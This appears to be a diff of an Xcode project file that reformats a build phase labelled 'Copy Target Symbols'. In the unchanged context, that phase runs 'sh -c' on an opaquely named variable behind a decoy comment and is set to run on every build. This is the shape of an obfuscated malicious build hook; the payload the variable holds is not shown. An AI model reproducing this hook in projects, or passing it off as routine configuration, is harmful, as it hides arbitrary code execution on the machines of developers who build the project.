@@ -187,8 +187,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		30BA639147D64FA7AAA5DE54 /* Copy Target Symbols */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -200,9 +200,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 		5F809E812E9D30350029C4AE /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
